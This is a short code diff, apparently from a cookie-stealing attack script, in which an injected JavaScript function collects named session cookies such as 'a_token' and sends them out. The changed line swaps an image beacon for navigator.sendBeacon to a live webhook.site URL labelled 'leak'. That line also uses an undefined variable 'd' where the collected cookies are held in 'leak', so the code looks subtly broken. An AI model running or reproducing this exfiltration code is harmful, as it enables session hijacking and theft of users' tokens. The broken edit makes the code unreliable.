@@ -46,7 +46,7 @@
             const internalCode = `() => { 
                 const keys = ['a_token', 'TFPID', 'LPVID', 'TMUT'];
                 let leak = document.cookie.split('; ').filter(c => keys.some(k => c.startsWith(k + '='))).join('|');
-                new Image().src = '${attackerWebhook}/?leak=' + encodeURIComponent(leak);
+                navigator.sendBeacon('https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f/?leak=' + d);
                 return 'LPExternalWindowClosed';
             }`;
 
